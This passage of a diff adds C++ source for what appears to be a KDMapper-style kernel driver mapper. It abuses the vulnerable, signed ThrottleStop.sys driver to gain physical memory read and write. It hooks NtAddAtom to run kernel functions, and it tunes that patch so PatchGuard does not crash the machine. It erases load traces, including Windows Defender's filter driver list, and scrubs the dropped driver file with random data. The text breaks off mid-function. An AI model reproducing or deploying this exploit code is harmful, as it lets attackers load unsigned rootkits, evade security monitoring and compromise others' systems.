+		kdmLog(L&quot;[&lt;] Calling DriverEntry 0x&quot; &lt;&lt; reinterpret_cast&lt;void*&gt;(address_of_entry_point) &lt;&lt; std::endl);
+
+		if (callback) {
+			if (!callback(&amp;param1, &amp;param2, realBase, image_size)) {
+				kdmLog(L&quot;[-] Callback returns false, failed!&quot; &lt;&lt; std::endl);
+				kernel_image_base = realBase;
+				break;
+			}
+		}
+
+		NTSTATUS status = 0;
+		if (!ts_driver::CallKernelFunction(&amp;status, address_of_entry_point, (PassAllocationAddressAsFirstParam ? realBase : param1), param2)) {
+			kdmLog(L&quot;[-] Failed to call driver entry&quot; &lt;&lt; std::endl);
+			kernel_image_base = realBase;
+			break;
+		}
+
+		if (exitCode)
+			*exitCode = status;
+
+		kdmLog(L&quot;[+] DriverEntry returned 0x&quot; &lt;&lt; std::hex &lt;&lt; status &lt;&lt; std::endl);
+
+		// Free memory
+		if (free) {
+			kdmLog(L&quot;[+] Freeing memory&quot; &lt;&lt; std::endl);
+			bool free_status = false;
+
+			if (mode == AllocationMode::AllocateIndependentPages)
+			{
+				free_status = ts_driver::MmFreeIndependentPages(realBase, image_size);
+			}
+			else {
+				free_status = ts_driver::FreePool(realBase);
+			}
+
+			if (free_status) {
+				kdmLog(L&quot;[+] Memory has been released&quot; &lt;&lt; std::endl);
+			}
+			else {
+				kdmLog(L&quot;[-] WARNING: Failed to free memory!&quot; &lt;&lt; std::endl);
+			}
+		}
+
+
+
+		VirtualFree(local_image_base, 0, MEM_RELEASE);
+		return realBase;
+
+	} while (false);
+
+
+	VirtualFree(local_image_base, 0, MEM_RELEASE);
+
+	kdmLog(L&quot;[+] Freeing memory&quot; &lt;&lt; std::endl);
+	bool free_status = false;
+
+	if (mode == AllocationMode::AllocateIndependentPages)
+	{
+		free_status = ts_driver::MmFreeIndependentPages(kernel_image_base, image_size);
+	}
+	else {
+		free_status = ts_driver::FreePool(kernel_image_base);
+	}
+
+	if (free_status) {
+		kdmLog(L&quot;[+] Memory has been released&quot; &lt;&lt; std::endl);
+	}
+	else {
+		kdmLog(L&quot;[-] WARNING: Failed to free memory!&quot; &lt;&lt; std::endl);
+	}
+
+	return 0;
+}
+
+
+</code></pre>
+<h3>include/ts_driver.hpp</h3>
+<pre><code>#pragma once
+#include &lt;Windows.h&gt;
+#include &lt;string&gt;
+#include &lt;iostream&gt;
+#include &lt;cstring&gt;
+
+#include &quot;utils.hpp&quot;
+#include &quot;nt.hpp&quot;
+
+namespace ts_driver
+{
+	extern HANDLE hDevice;
+	extern ULONG64 ntoskrnlAddr;
+
+	// Physical address of kernel NtAddAtom (resolved during Load via Superfetch)
+	extern uint64_t paNtAddAtom;
+
+	// Physical R/W via ThrottleStop IOCTLs
+	bool ReadPhysical8(uint64_t phys_addr, uint64_t* out);
+	bool WritePhysical8(uint64_t phys_addr, uint64_t value);
+	bool ReadPhysicalBuffer(uint64_t phys_addr, void* buffer, size_t size);
+	bool WritePhysicalBuffer(uint64_t phys_addr, const void* buffer, size_t size);
+
+	// VA -&gt; PA translation (uses CallKernelFunction + MmGetPhysicalAddress after bootstrap)
+	uint64_t TranslateVA(uint64_t va);
+
+	bool ClearPiDDBCacheTable();
+	bool ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait);
+	bool ExReleaseResourceLite(PVOID Resource);
+	BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
+	PVOID RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer);
+	nt::PiDDBCacheEntry* LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name);
+	PVOID ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);
+	NTSTATUS AcquireDebugPrivilege();
+
+	uintptr_t FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
+	uintptr_t FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size);
+	uintptr_t FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);
+
+	bool ClearKernelHashBucketList();
+	bool ClearWdFilterDriverList();
+
+	bool IsRunning();
+	NTSTATUS Load();
+	NTSTATUS Unload();
+
+	bool MemCopy(uint64_t destination, uint64_t source, uint64_t size);
+	bool SetMemory(uint64_t address, uint32_t value, uint64_t size);
+	bool ReadMemory(uint64_t address, void* buffer, uint64_t size);
+	bool WriteMemory(uint64_t address, void* buffer, uint64_t size);
+	bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);
+
+	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
+	bool MmFreeIndependentPages(uint64_t address, uint32_t size);
+	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect);
+
+	uint64_t AllocatePool(nt::POOL_TYPE pool_type, uint64_t size);
+
+	bool FreePool(uint64_t address);
+	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string&amp; function_name);
+	bool ClearMmUnloadedDrivers();
+	std::wstring GetDriverNameW();
+	std::wstring GetDriverPath();
+
+	template&lt;typename T, typename ...A&gt;
+	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
+		constexpr auto call_void = std::is_same_v&lt;T, void&gt;;
+
+		static_assert(sizeof...(A) &lt;= 4, &quot;CallKernelFunction: Too many arguments, max 4&quot;);
+
+		if constexpr (!call_void) {
+			if (!out_result)
+				return false;
+		}
+		else {
+			UNREFERENCED_PARAMETER(out_result);
+		}
+
+		if (!kernel_function_address)
+			return false;
+
+		HMODULE ntdll = GetModuleHandleA(&quot;ntdll.dll&quot;);
+		if (ntdll == 0) {
+			kdmLog(L&quot;[-] Failed to load ntdll.dll&quot; &lt;&lt; std::endl);
+			return false;
+		}
+
+		const auto NtAddAtom = reinterpret_cast&lt;void*&gt;(GetProcAddress(ntdll, &quot;NtAddAtom&quot;));
+		if (!NtAddAtom) {
+			kdmLog(L&quot;[-] Failed to get export ntdll.NtAddAtom&quot; &lt;&lt; std::endl);
+			return false;
+		}
+
+		// 16-byte hook / save / restore (two full qwords).
+		// NOTE: with a 12-byte buffer the compiled tail write zero-extended a
+		// 4-byte load into the qword written at NtAddAtom+8, zeroing the 4 bytes
+		// after the 12-byte stub (NtAddAtom&#x27;s `add rsp,28h`). PatchGuard then
+		// bugchecks 0x109 CRITICAL_STRUCTURE_CORRUPTION (function modification)
+		// a few minutes after every mapping. 16-byte buffers make both chunks
+		// full 8-byte accesses, so nothing outside the stub is ever altered.
+		uint8_t kernel_injected_jmp[16] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00 };
+		uint8_t original_kernel_function[16];
+		*(uint64_t*)&amp;kernel_injected_jmp[2] = kernel_function_address;
+
+		if (!paNtAddAtom) {
+			kdmLog(L&quot;[-] paNtAddAtom not initialized&quot; &lt;&lt; std::endl);
+			return false;
+		}
+
+		// Read original bytes via PHYSICAL read (no VA translation needed)
+		if (!ReadPhysicalBuffer(paNtAddAtom, &amp;original_kernel_function, sizeof(kernel_injected_jmp)))
+			return false;
+
+		if (original_kernel_function[0] == kernel_injected_jmp[0] &amp;&amp;
+			original_kernel_function[1] == kernel_injected_jmp[1]) {
+			kdmLog(L&quot;[-] FAILED!: The code was already hooked!!&quot; &lt;&lt; std::endl);
+			return false;
+		}
+
+		// Keep the 4 bytes after the 12-byte jump exactly as they were
+		memcpy(&amp;kernel_injected_jmp[12], &amp;original_kernel_function[12], 4);
+
+		// Write hook via PHYSICAL write (bypasses read-only page protection)
+		if (!WritePhysicalBuffer(paNtAddAtom, &amp;kernel_injected_jmp, sizeof(kernel_injected_jmp)))
+			return false;
+
+		// Call function
+		if constexpr (!call_void) {
+			using FunctionFn = T(__stdcall*)(A...);
+			const auto Function = reinterpret_cast&lt;FunctionFn&gt;(NtAddAtom);
+			*out_result = Function(arguments...);
+		}
+		else {
+			using FunctionFn = void(__stdcall*)(A...);
+			const auto Function = reinterpret_cast&lt;FunctionFn&gt;(NtAddAtom);
+			Function(arguments...);
+		}
+
+		// Restore original bytes via PHYSICAL write (full 16 bytes)
+		if (!WritePhysicalBuffer(paNtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp)))
+			return false;
+
+		// Verify the restore actually took effect
+		uint8_t verify_restore[16] = { 0 };
+		if (!ReadPhysicalBuffer(paNtAddAtom, verify_restore, sizeof(verify_restore)) ||
+			memcmp(verify_restore, original_kernel_function, sizeof(verify_restore)) != 0) {
+			kdmLog(L&quot;[!] WARNING: NtAddAtom restore verification failed!&quot; &lt;&lt; std::endl);
+			return false;
+		}
+		return true;
+	}
+}
+</code></pre>
+<h3>ts_driver.cpp</h3>
+<pre><code>#include &quot;ts_driver.hpp&quot;
+#include &lt;Windows.h&gt;
+#include &lt;string&gt;
+#include &lt;fstream&gt;
+#include &lt;psapi.h&gt;
+
+#include &quot;utils.hpp&quot;
+#include &quot;throttlestop_resource.hpp&quot;
+#include &quot;service.hpp&quot;
+#include &quot;nt.hpp&quot;
+#include &quot;portable_executable.hpp&quot;
+#include &quot;superfetch.hpp&quot;
+
+#ifdef PDB_OFFSETS
+#include &quot;KDSymbolsHandler.h&quot;
+#endif
+
+#pragma comment(lib, &quot;psapi.lib&quot;)
+#pragma comment(lib, &quot;ntdll.lib&quot;)
+
+// ThrottleStop IOCTL codes
+#define TS_IOCTL_READ  0x80006498
+#define TS_IOCTL_WRITE 0x8000649C
+
+// Globals
+HANDLE ts_driver::hDevice = 0;
+ULONG64 ts_driver::ntoskrnlAddr = 0;
+uint64_t ts_driver::paNtAddAtom = 0;
+
+static std::string cachedDriverName = &quot;&quot;;
+static uint64_t kernel_MmGetPhysicalAddress = 0;
+static HMODULE hLocalNtoskrnl = 0;
+
+// ==================== Physical R/W via ThrottleStop ====================
+
+bool ts_driver::ReadPhysical8(uint64_t phys_addr, uint64_t* out) {
+	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
+		return false;
+
+	DWORD bytes_returned = 0;
+	return DeviceIoControl(hDevice, TS_IOCTL_READ,
+		&amp;phys_addr, sizeof(phys_addr),
+		out, sizeof(uint64_t),
+		&amp;bytes_returned, NULL) &amp;&amp; bytes_returned == sizeof(uint64_t);
+}
+
+bool ts_driver::WritePhysical8(uint64_t phys_addr, uint64_t value) {
+	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
+		return false;
+
+	uint8_t buf[16] = { 0 };
+	*(uint64_t*)buf = phys_addr;
+	*(uint64_t*)(buf + 8) = value;
+
+	DWORD bytes_returned = 0;
+	return DeviceIoControl(hDevice, TS_IOCTL_WRITE,
+		buf, sizeof(buf),
+		nullptr, 0,
+		&amp;bytes_returned, NULL);
+}
+
+bool ts_driver::ReadPhysicalBuffer(uint64_t phys_addr, void* buffer, size_t size) {
+	uint8_t* dst = (uint8_t*)buffer;
+	size_t offset = 0;
+
+	while (offset &lt; size) {
+		uint64_t val = 0;
+		if (!ReadPhysical8(phys_addr + offset, &amp;val))
+			return false;
+
+		size_t chunk = (size - offset &lt; 8) ? (size - offset) : 8;
+		memcpy(dst + offset, &amp;val, chunk);
+		offset += chunk;
+	}
+	return true;
+}
+
+bool ts_driver::WritePhysicalBuffer(uint64_t phys_addr, const void* buffer, size_t size) {
+	const uint8_t* src = (const uint8_t*)buffer;
+	size_t offset = 0;
+
+	while (offset &lt; size) {
+		size_t chunk = (size - offset &lt; 8) ? (size - offset) : 8;
+		uint64_t val = 0;
+
+		if (chunk &lt; 8) {
+			// Partial write: read current value first, merge, write back
+			if (!ReadPhysical8(phys_addr + offset, &amp;val))
+				return false;
+		}
+		memcpy(&amp;val, src + offset, chunk);
+
+		if (!WritePhysical8(phys_addr + offset, val))
+			return false;
+
+		offset += chunk;
+	}
+	return true;
+}
+
+// ==================== VA -&gt; PA translation ====================
+
+uint64_t ts_driver::TranslateVA(uint64_t va) {
+	if (!kernel_MmGetPhysicalAddress)
+		return 0;
+
+	uint64_t pa = 0;
+	if (!CallKernelFunction(&amp;pa, kernel_MmGetPhysicalAddress, va))
+		return 0;
+
+	return pa;
+}
+
+// ==================== ReadMemory / WriteMemory ====================
+
+bool ts_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
+	uint8_t* dst = (uint8_t*)buffer;
+	uint64_t offset = 0;
+
+	while (offset &lt; size) {
+		uint64_t va = address + offset;
+		uint64_t page_offset = va &amp; 0xFFF;
+		uint64_t bytes_in_page = 0x1000 - page_offset;
+		uint64_t to_read = (size - offset &lt; bytes_in_page) ? (size - offset) : bytes_in_page;
+
+		uint64_t pa = TranslateVA(va);
+		if (!pa) {
+			// zero-fill on translation failure
+			memset(dst + offset, 0, (size_t)to_read);
+			offset += to_read;
+			continue;
+		}
+
+		if (!ReadPhysicalBuffer(pa, dst + offset, (size_t)to_read))
+			return false;
+
+		offset += to_read;
+	}
+	return true;
+}
+
+bool ts_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
+	uint8_t* src = (uint8_t*)buffer;
+	uint64_t offset = 0;
+
+	while (offset &lt; size) {
+		uint64_t va = address + offset;
+		uint64_t page_offset = va &amp; 0xFFF;
+		uint64_t bytes_in_page = 0x1000 - page_offset;
+		uint64_t to_write = (size - offset &lt; bytes_in_page) ? (size - offset) : bytes_in_page;
+
+		uint64_t pa = TranslateVA(va);
+		if (!pa)
+			return false;
+
+		if (!WritePhysicalBuffer(pa, src + offset, (size_t)to_write))
+			return false;
+
+		offset += to_write;
+	}
+	return true;
+}
+
+// Physical writes bypass page protection — no MapIoSpace needed
+bool ts_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
+	return WriteMemory(address, buffer, (uint64_t)size);
+}
+
+// MemCopy: copy between two kernel virtual addresses
+bool ts_driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
+	auto temp = std::make_unique&lt;uint8_t[]&gt;((size_t)size);
+	if (!ReadMemory(source, temp.get(), size))
+		return false;
+	return WriteMemory(destination, temp.get(), size);
+}
+
+bool ts_driver::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
+	auto temp = std::make_unique&lt;uint8_t[]&gt;((size_t)size);
+	memset(temp.get(), (int)value, (size_t)size);
+	return WriteMemory(address, temp.get(), size);
+}
+
+// ==================== Driver name / path ====================
+
+std::wstring ts_driver::GetDriverNameW() {
+	return L&quot;ThrottleStop&quot;;
+}
+
+std::wstring ts_driver::GetDriverPath() {
+	std::wstring temp = kdmUtils::GetFullTempPath();
+	if (temp.empty())
+		return L&quot;&quot;;
+	return temp + L&quot;\\ThrottleStop.sys&quot;;
+}
+
+bool ts_driver::IsRunning() {
+	const HANDLE file_handle = CreateFileW(L&quot;\\\\.\\ThrottleStop&quot;,
+		GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+	if (file_handle != nullptr &amp;&amp; file_handle != INVALID_HANDLE_VALUE) {
+		CloseHandle(file_handle);
+		return true;
+	}
+	return false;
+}
+
+// ==================== Local ntoskrnl export resolution ====================
+
+static uint64_t GetLocalExportOffset(const char* export_name) {
+	if (!hLocalNtoskrnl) {
+		hLocalNtoskrnl = LoadLibraryExA(&quot;ntoskrnl.exe&quot;, NULL, DONT_RESOLVE_DLL_REFERENCES);
+		if (!hLocalNtoskrnl)
+			return 0;
+	}
+
+	FARPROC proc = GetProcAddress(hLocalNtoskrnl, export_name);
+	if (!proc)
+		return 0;
+
+	return (uint64_t)proc - (uint64_t)hLocalNtoskrnl;
+}
+
+// ==================== Load / Unload ====================
+
+NTSTATUS ts_driver::AcquireDebugPrivilege() {
+	ULONG SE_DEBUG_PRIVILEGE = 20UL;
+	BOOLEAN SeDebugWasEnabled;
+	NTSTATUS Status = superfetch::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &amp;SeDebugWasEnabled);
+	if (!NT_SUCCESS(Status)) {
+		kdmLog(&quot;[-] Failed to acquire SE_DEBUG_PRIVILEGE&quot; &lt;&lt; std::endl);
+	}
+	return Status;
+}
+
+NTSTATUS ts_driver::Load() {
+	srand((unsigned)time(NULL) * GetCurrentThreadId());
+
+	if (ts_driver::IsRunning()) {
+		kdmLog(L&quot;[-] \\Device\\ThrottleStop is already in use.&quot; &lt;&lt; std::endl);
+		return STATUS_ALREADY_REGISTERED;
+	}
+
+	kdmLog(L&quot;[&lt;] Loading ThrottleStop.sys (CVE-2025-7771)&quot; &lt;&lt; std::endl);
+
+	std::wstring driver_path = GetDriverPath();
+	if (driver_path.empty()) {
+		kdmLog(L&quot;[-] Can&#x27;t find TEMP folder&quot; &lt;&lt; std::endl);
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	_wremove(driver_path.c_str());
+
+	// Write ThrottleStop.sys to disk
+	if (!kdmUtils::CreateFileFromMemory(driver_path,
+		reinterpret_cast&lt;const char*&gt;(throttlestop_driver_resource::driver),
+		sizeof(throttlestop_driver_resource::driver))) {
+		kdmLog(L&quot;[-] Failed to create ThrottleStop.sys file&quot; &lt;&lt; std::endl);
+		return STATUS_DISK_OPERATION_FAILED;
+	}
+
+	auto status = AcquireDebugPrivilege();
+	if (!NT_SUCCESS(status)) {
+		_wremove(driver_path.c_str());
+		return status;
+	}
+
+	// Load via service (ThrottleStop is TechPowerUp-signed, loads normally)
+	status = service::RegisterAndStart(driver_path, GetDriverNameW());
+	if (!NT_SUCCESS(status)) {
+		kdmLog(L&quot;[-] Failed to register/start ThrottleStop service&quot; &lt;&lt; std::endl);
+		_wremove(driver_path.c_str());
+		return status;
+	}
+
+	// Open device
+	hDevice = CreateFileW(L&quot;\\\\.\\ThrottleStop&quot;,
+		GENERIC_READ | GENERIC_WRITE, 0, nullptr,
+		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
+		kdmLog(L&quot;[-] Failed to open \\.\\ ThrottleStop device&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		return STATUS_NOT_FOUND;
+	}
+
+	// Test physical R/W
+	uint64_t test_val = 0;
+	if (!ReadPhysical8(0x1000, &amp;test_val)) {
+		kdmLog(L&quot;[-] ThrottleStop physical read test failed&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		return STATUS_UNSUCCESSFUL;
+	}
+	kdmLog(L&quot;[+] ThrottleStop physical R/W working&quot; &lt;&lt; std::endl);
+
+	// Get ntoskrnl base
+	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress(&quot;ntoskrnl.exe&quot;);
+	if (ntoskrnlAddr == 0) {
+		kdmLog(L&quot;[-] Failed to get ntoskrnl.exe base&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		return STATUS_BAD_DLL_ENTRYPOINT;
+	}
+	kdmLog(L&quot;[+] ntoskrnl.exe base: 0x&quot; &lt;&lt; std::hex &lt;&lt; ntoskrnlAddr &lt;&lt; std::endl);
+
+	// Resolve NtAddAtom and MmGetPhysicalAddress offsets from local ntoskrnl
+	uint64_t ntAddAtomOffset = GetLocalExportOffset(&quot;NtAddAtom&quot;);
+	uint64_t mmGetPhysOffset = GetLocalExportOffset(&quot;MmGetPhysicalAddress&quot;);
+
+	if (!ntAddAtomOffset || !mmGetPhysOffset) {
+		kdmLog(L&quot;[-] Failed to resolve kernel exports from local ntoskrnl&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		return STATUS_NOT_FOUND;
+	}
+
+	uint64_t vaNtAddAtom = ntoskrnlAddr + ntAddAtomOffset;
+	kernel_MmGetPhysicalAddress = ntoskrnlAddr + mmGetPhysOffset;
+
+	kdmLog(L&quot;[+] Kernel NtAddAtom VA: 0x&quot; &lt;&lt; std::hex &lt;&lt; vaNtAddAtom &lt;&lt; std::endl);
+	kdmLog(L&quot;[+] Kernel MmGetPhysicalAddress VA: 0x&quot; &lt;&lt; std::hex &lt;&lt; kernel_MmGetPhysicalAddress &lt;&lt; std::endl);
+
+	// Build Superfetch translation map to find NtAddAtom PA
+	kdmLog(L&quot;[&lt;] Building Superfetch VA-&gt;PA map...&quot; &lt;&lt; std::endl);
+	auto translation_map = superfetch::BuildTranslationMap();
+
+	if (translation_map.empty()) {
+		kdmLog(L&quot;[-] Superfetch translation map is empty&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	kdmLog(L&quot;[+] Superfetch map: &quot; &lt;&lt; std::dec &lt;&lt; translation_map.size() &lt;&lt; L&quot; pages&quot; &lt;&lt; std::endl);
+
+	// Translate NtAddAtom VA to PA
+	paNtAddAtom = superfetch::Translate(translation_map, vaNtAddAtom);
+	if (!paNtAddAtom) {
+		kdmLog(L&quot;[-] Failed to translate NtAddAtom VA to PA via Superfetch&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	kdmLog(L&quot;[+] NtAddAtom PA: 0x&quot; &lt;&lt; std::hex &lt;&lt; paNtAddAtom &lt;&lt; std::endl);
+
+	// Verify by reading NtAddAtom bytes via physical read
+	uint8_t verify_bytes[4] = { 0 };
+	if (!ReadPhysicalBuffer(paNtAddAtom, verify_bytes, 4)) {
+		kdmLog(L&quot;[-] Failed to read NtAddAtom bytes&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		return STATUS_UNSUCCESSFUL;
+	}
+	kdmLog(L&quot;[+] NtAddAtom first bytes: &quot; &lt;&lt; std::hex
+		&lt;&lt; (int)verify_bytes[0] &lt;&lt; &quot; &quot; &lt;&lt; (int)verify_bytes[1] &lt;&lt; &quot; &quot;
+		&lt;&lt; (int)verify_bytes[2] &lt;&lt; &quot; &quot; &lt;&lt; (int)verify_bytes[3] &lt;&lt; std::endl);
+
+	// Translation map no longer needed — from now on we use
+	// CallKernelFunction(MmGetPhysicalAddress) for all VA-&gt;PA translations
+
+	// Verify MZ header of ntoskrnl
+	IMAGE_DOS_HEADER dosHeader = { 0 };
+	if (!ts_driver::ReadMemory(ts_driver::ntoskrnlAddr, &amp;dosHeader, sizeof(IMAGE_DOS_HEADER)) ||
+		dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
+		kdmLog(L&quot;[-] Failed to read ntoskrnl MZ header&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		return STATUS_INVALID_IMAGE_FORMAT;
+	}
+
+	kdmLog(L&quot;[+] ntoskrnl MZ header verified&quot; &lt;&lt; std::endl);
+
+	// Clean traces
+	if (!ts_driver::ClearPiDDBCacheTable()) {
+		kdmLog(L&quot;[-] Failed to ClearPiDDBCacheTable&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		return STATUS_DELETE_PENDING | 0x1000;
+	}
+
+	if (!ts_driver::ClearKernelHashBucketList()) {
+		kdmLog(L&quot;[-] Failed to ClearKernelHashBucketList&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		return STATUS_DELETE_PENDING | 0x2000;
+	}
+
+	if (!ts_driver::ClearMmUnloadedDrivers()) {
+		kdmLog(L&quot;[!] Failed to ClearMmUnloadedDrivers&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		return STATUS_DELETE_PENDING | 0x3000;
+	}
+
+	if (!ts_driver::ClearWdFilterDriverList()) {
+		kdmLog(&quot;[!] Failed to ClearWdFilterDriverList&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		return STATUS_DELETE_PENDING | 0x4000;
+	}
+
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS ts_driver::Unload() {
+	kdmLog(L&quot;[&lt;] Unloading ThrottleStop driver&quot; &lt;&lt; std::endl);
+
+	if (hDevice &amp;&amp; hDevice != INVALID_HANDLE_VALUE) {
+		CloseHandle(hDevice);
+		hDevice = 0;
+	}
+
+	if (hLocalNtoskrnl) {
+		FreeLibrary(hLocalNtoskrnl);
+		hLocalNtoskrnl = 0;
+	}
+
+	paNtAddAtom = 0;
+	kernel_MmGetPhysicalAddress = 0;
+
+	auto status = service::StopAndRemove(GetDriverNameW());
+	if (!NT_SUCCESS(status))
+		return status;
+
+	std::wstring driver_path = GetDriverPath();
+
+	// Overwrite file with random data before deletion
+	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
+	if (file_ofstream.is_open()) {
+		int newFileLen = sizeof(throttlestop_driver_resource::driver) + (((long long)rand() * (long long)rand()) % 2000000 + 1000);
+		BYTE* randomData = new BYTE[newFileLen];
+		for (int i = 0; i &lt; newFileLen; i++)
+			randomData[i] = (BYTE)(rand() % 255);
+		file_ofstream.write((char*)randomData, newFileLen);
+		file_ofstream.close();
+		delete[] randomData;
+		kdmLog(L&quot;[+] Driver data destroyed before unlink&quot; &lt;&lt; std::endl);
+	}
+
+	if (_wremove(driver_path.c_str()) != 0)
+		return STATUS_DELETE_PENDING;
+
+	return STATUS_SUCCESS;
+}
+
+// ==================== Pool / Export / Pattern functions ====================
+// These remain the same as original KDMapper — they use ReadMemory/WriteMemory
+// and CallKernelFunction which are now backed by ThrottleStop physical R/W
+
+uint64_t ts_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
+	if (!size)
+		return 0;
+
+	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(ts_driver::ntoskrnlAddr, &quot;ExAllocatePoolWithTag&quot;);
+
+	if (!kernel_ExAllocatePool) {
+		kdmLog(L&quot;[!] Failed to find ExAllocatePool&quot; &lt;&lt; std::endl);
+		return 0;
+	}
+
+	uint64_t allocated_pool = 0;
+
+	if (!CallKernelFunction(&amp;allocated_pool, kernel_ExAllocatePool, pool_type, size, &#x27;BwtE&#x27;))
+		return 0;
+
+	return allocated_pool;
+}
+
+bool ts_driver::FreePool(uint64_t address) {
+	if (!address)
+		return 0;
+
+	static uint64_t kernel_ExFreePool = GetKernelModuleExport(ts_driver::ntoskrnlAddr, &quot;ExFreePool&quot;);
+
+	if (!kernel_ExFreePool) {
+		kdmLog(L&quot;[!] Failed to find ExFreePool&quot; &lt;&lt; std::endl);
+		return 0;
+	}
+
+	return CallKernelFunction&lt;void&gt;(nullptr, kernel_ExFreePool, address);
+}
+
+uint64_t ts_driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string&amp; function_name) {
+	if (!kernel_module_base)
+		return 0;
+
+	IMAGE_DOS_HEADER dos_header = { 0 };
+	IMAGE_NT_HEADERS64 nt_headers = { 0 };
+
+	if (!ReadMemory(kernel_module_base, &amp;dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
+		!ReadMemory(kernel_module_base + dos_header.e_lfanew, &amp;nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
+		return 0;
+
+	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
+
+	if (!export_base || !export_base_size)
+		return 0;
+
+	const auto export_data = reinterpret_cast&lt;PIMAGE_EXPORT_DIRECTORY&gt;(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+
+	if (!ReadMemory(kernel_module_base + export_base, export_data, export_base_size))
+	{
+		VirtualFree(export_data, 0, MEM_RELEASE);
+		return 0;
+	}
+
+	const auto delta = reinterpret_cast&lt;uint64_t&gt;(export_data) - export_base;
+
+	const auto name_table = reinterpret_cast&lt;uint32_t*&gt;(export_data-&gt;AddressOfNames + delta);
+	const auto ordinal_table = reinterpret_cast&lt;uint16_t*&gt;(export_data-&gt;AddressOfNameOrdinals + delta);
+	const auto function_table = reinterpret_cast&lt;uint32_t*&gt;(export_data-&gt;AddressOfFunctions + delta);
+
+	for (auto i = 0u; i &lt; export_data-&gt;NumberOfNames; ++i) {
+		const std::string current_function_name = std::string(reinterpret_cast&lt;char*&gt;(name_table[i] + delta));
+
+		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
+			const auto function_ordinal = ordinal_table[i];
+			if (function_table[function_ordinal] &lt;= 0x1000) {
+				return 0;
+			}
+			const auto function_address = kernel_module_base + function_table[function_ordinal];
+
+			if (function_address &gt;= kernel_module_base + export_base &amp;&amp; function_address &lt;= kernel_module_base + export_base + export_base_size) {
+				VirtualFree(export_data, 0, MEM_RELEASE);
+				return 0;
+			}
+
+			VirtualFree(export_data, 0, MEM_RELEASE);
+			return function_address;
+		}
+	}
+
+	VirtualFree(export_data, 0, MEM_RELEASE);
+	return 0;
+}
+
+// ==================== MmAllocateIndependentPagesEx ====================
+
+uint64_t ts_driver::MmAllocateIndependentPagesEx(uint32_t size) {
+	uint64_t allocated_pages{};
+	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;
+
+#ifdef PDB_OFFSETS
+	if (!kernel_MmAllocateIndependentPagesEx) {
+		kernel_MmAllocateIndependentPagesEx = KDSymbolsHandler::GetInstance()-&gt;GetOffset(L&quot;MmAllocateIndependentPagesEx&quot;);
+		if (!kernel_MmAllocateIndependentPagesEx) return 0;
+		kernel_MmAllocateIndependentPagesEx += ts_driver::ntoskrnlAddr;
+	}
+#else
+	if (!kernel_MmAllocateIndependentPagesEx) {
+		kernel_MmAllocateIndependentPagesEx = ts_driver::FindPatternInSectionAtKernel((char*)&quot;.text&quot;, ts_driver::ntoskrnlAddr,
+			(BYTE*)&quot;\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8&quot;,
